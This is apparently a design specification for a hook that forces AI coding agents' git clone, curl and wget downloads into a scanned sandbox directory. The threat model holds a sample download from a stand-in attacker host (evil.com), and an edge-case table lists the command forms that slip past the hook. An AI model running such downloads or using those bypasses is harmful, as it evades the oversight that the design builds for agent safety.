# F-006: Sandbox Enforcer Hook

## Problem & Pain

The content filter (F-001 through F-005) scans files inside the sandbox directory before an agent reads them. But nothing enforces that external content actually lands in the sandbox. An agent can `git clone` a repo anywhere on the filesystem, bypassing the content filter entirely.

The enforcement gap:
```
Current:    git clone https://github.com/someone/repo.git ~/work/repo
            → content lands OUTSIDE sandbox → content filter never fires

Required:   git clone https://github.com/someone/repo.git ~/work/repo
            → hook rewrites to: git clone ... ~/work/sandbox/repo
            → content filter fires on every subsequent Read
```

Without this hook, the sandbox directory is a convention, not an enforcement boundary. The content filter's security guarantees depend on content being in the right place — this hook makes that mandatory.

## Users & Context

**Primary user:** PAI agents running under Claude Code with the content filter hook installed.

**Context:** The agent is doing cross-project collaboration — reading external repos, reviewing PRs, downloading artifacts from the internet. Any Bash command that brings external content onto the local filesystem must route that content to the sandbox.

## Threat Model

| Vector | Example | Without Hook | With Hook |
|--------|---------|-------------|-----------|
| git clone to arbitrary path | `git clone evil-repo ~/work/trusted/` | Content bypasses filter | Rewritten to `~/work/sandbox/evil-repo/` |
| curl/wget download | `curl -o ~/important.yaml https://evil.com/payload` | File lands unscanned | Rewritten to `~/work/sandbox/important.yaml` |
| gh pr checkout | `gh pr checkout 123` into current dir | PR content unscanned | Blocked if not in sandbox dir |
| gh repo clone | `gh repo clone owner/repo` | Same as git clone | Rewritten to sandbox |
| cp from external mount | `cp /mnt/shared/file.yaml ~/work/` | Bypass via local copy | Out of scope (not a network command) |

**Out of scope for v1:** Local file copies (`cp`, `mv`), manual file creation (`Write` tool), browser downloads. These require different enforcement mechanisms.

## Requirements

### R-001: Intercept external content acquisition commands

The hook MUST intercept Bash commands that bring external content onto the local filesystem:

| Command Pattern | Action |
|----------------|--------|
| `git clone <url> [<dir>]` | Rewrite `<dir>` to sandbox path |
| `git clone <url>` (no dir) | Append sandbox path as destination |
| `gh repo clone <owner/repo> [<dir>]` | Rewrite `<dir>` to sandbox path |
| `curl -o <path> <url>` / `curl <url> -o <path>` | Rewrite `<path>` to sandbox path |
| `curl <url> > <path>` | Rewrite redirect target to sandbox (or block) |
| `wget -O <path> <url>` / `wget <url>` | Rewrite `-O` path or default output to sandbox |
| `wget -P <dir> <url>` | Rewrite `-P` directory to sandbox |

### R-002: Preserve agent workflow for local operations

The hook MUST NOT interfere with:

| Command | Why It's Safe |
|---------|--------------|
| `git commit`, `git push`, `git branch` | Local operations, no inbound content |
| `git pull` (in own repo) | Already in workspace — but see R-005 |
| `git diff`, `git log`, `git status` | Read-only local operations |
| `ls`, `cat`, `find` | Local filesystem (already gated by content filter hook for sandbox paths) |
| `npm install`, `bun install` | Package managers have their own integrity checks |
| `bun test`, `bun run` | Local execution |

### R-003: Rewrite via `updatedInput`, don't just block

The hook SHOULD rewrite commands to use the sandbox directory rather than blocking with an error. This preserves the agent's workflow:

```
Input:   git clone https://github.com/someone/repo.git
Output:  git clone https://github.com/someone/repo.git ~/work/sandbox/repo

Input:   curl -o data.json https://api.example.com/data
Output:  curl -o ~/work/sandbox/data.json https://api.example.com/data
```

The hook outputs JSON with `updatedInput` and `permissionDecision: "allow"` to rewrite and auto-approve. For ambiguous commands, use `permissionDecision: "ask"` to let the user confirm.

### R-004: Clear stderr feedback

When a command is rewritten, the hook MUST output a clear message to stderr:

```
[SandboxEnforcer] Redirected git clone to sandbox: ~/work/sandbox/repo
[SandboxEnforcer] Redirected download to sandbox: ~/work/sandbox/data.json
```

When a command is blocked (can't be safely rewritten), explain why:

```
[SandboxEnforcer] BLOCKED: Cannot safely rewrite piped download. Use: curl <url> -o ~/work/sandbox/<filename>
```

### R-005: Handle git pull from external remotes

`git pull` is tricky — it's safe when pulling from your own remote, but brings external content when pulling from someone else's repo (e.g., after `git remote add upstream`).

For v1, the hook SHOULD:
- Allow `git pull` if the current working directory is NOT inside the sandbox (agent's own repos are trusted)
- Allow `git pull` if inside the sandbox (content is already sandboxed, filter will scan on read)
- This means: if you clone a repo to sandbox and then pull updates inside it, that's fine — the content filter still gates reads

### R-006: Environment variable configuration

| Variable | Purpose | Default |
|----------|---------|---------|
| `CONTENT_FILTER_SANDBOX_DIR` | Sandbox directory path | Required |
| `CONTENT_FILTER_ENFORCER_MODE` | `rewrite` (default) or `block` | `rewrite` |

In `block` mode, the hook denies commands instead of rewriting them. This is the strict alternative for environments that want explicit control.

## Technical Constraints

- **PreToolUse hook on Bash** — receives JSON with `tool_input.command`
- **Command parsing is best-effort** — shell commands can be arbitrarily complex (`git clone foo && cd foo && ...`). The hook handles common patterns; edge cases fail-open.
- **No shell expansion** — the hook sees the raw command string, not the expanded version. `~` and `$HOME` are literals in the JSON.
- **Chained commands** — `&&` and `||` chains: parse first command only. If it's a clone/download, rewrite just that segment.
- **Fail-open** — if the hook cannot parse the command, allow it. False negatives are better than breaking the agent's workflow.

## Decision Logic

```
Receive Bash tool_input.command
    │
    ├── Is it a git clone / gh repo clone?
    │     └── Extract URL and destination
    │           ├── Has explicit destination outside sandbox → REWRITE to sandbox
    │           ├── Has explicit destination inside sandbox → ALLOW (already correct)
    │           └── No destination specified → REWRITE to add sandbox/<repo-name>
    │
    ├── Is it curl -o / wget -O / wget -P?
    │     └── Extract output path
    │           ├── Path outside sandbox → REWRITE to sandbox
    │           ├── Path inside sandbox → ALLOW
    │           └── Cannot determine path (piped, etc.) → ALLOW (fail-open)
    │
    ├── Is it curl/wget without -o (stdout) or with pipe?
    │     └── ALLOW (output goes to stdout, not filesystem)
    │
    └── None of the above
          └── ALLOW (not an acquisition command)
```

## Edge Cases

| Case | Behavior | Rationale |
|------|----------|-----------|
| `git clone --depth 1 <url>` | Rewrite (flags before URL are preserved) | Shallow clones are still external content |
| `git clone <url> .` | Rewrite `.` to sandbox path | Cloning into current dir is common |
| `curl -L -o file.json <url>` | Rewrite `-o` target | Follow-redirect flag doesn't change output handling |
| `curl <url> \| jq .data > file.json` | ALLOW (fail-open) | Piped commands are too complex to safely rewrite |
| Command in subshell `$(git clone ...)` | ALLOW (fail-open) | Subshells are out of scope for v1 |
| Multiple commands `git clone a && git clone b` | Rewrite first clone only | Best-effort; second clone may bypass |
| `git clone` inside a script `bash script.sh` | ALLOW (fail-open) | Hook only sees `bash script.sh`, not contents |
| Agent already in sandbox dir | ALLOW | Current dir is sandbox — no rewrite needed |

## Composition with Content Filter

The two hooks form a complete security chain:

```
Agent runs: git clone https://github.com/someone/repo.git

  HOOK 1: SandboxEnforcer (PreToolUse on Bash)
  → Rewrites to: git clone ... ~/work/sandbox/repo
  → Repo cloned into sandbox

  ... later ...

  Agent runs: Read("~/work/sandbox/repo/EXTEND.yaml")

  HOOK 2: ContentFilter (PreToolUse on Read/Glob/Grep)
  → Path starts with SANDBOX_DIR → runs filter pipeline
  → BLOCKED / ALLOWED / HUMAN_REVIEW
```

**Both hooks use the same `CONTENT_FILTER_SANDBOX_DIR`** — single configuration, two enforcement points.

## Success Criteria

| Criterion | Test |
|-----------|------|
| `git clone <url>` without destination → rewritten to sandbox | Hook output includes `updatedInput` with sandbox path |
| `git clone <url> <dir>` outside sandbox → rewritten | Destination changed to sandbox/<dirname> |
| `git clone <url> <sandbox/dir>` → allowed as-is | No rewrite needed |
| `curl -o <path> <url>` outside sandbox → rewritten | Output path changed to sandbox |
| `git commit` → not intercepted | Hook exits 0, no rewrite |
| `git pull` in own workspace → not intercepted | Hook exits 0 |
| Malformed command → fail-open | Hook exits 0 |
| Chained `git clone a && cd a` → first segment rewritten | Only clone portion modified |
| Clear stderr message on every rewrite | Message includes old and new path |

## Scope & Future

**In scope (v1):**
- git clone, gh repo clone
- curl with -o flag
- wget with -O or -P flag
- Rewrite mode (default) and block mode

**Future (v2+):**
- Track which external repos the agent has cloned (audit trail)
- git submodule handling
- Multiple sandbox directories (per-project isolation)
- Integration with `git pull` remote origin checking
- Browser download interception (separate hook on file system events)
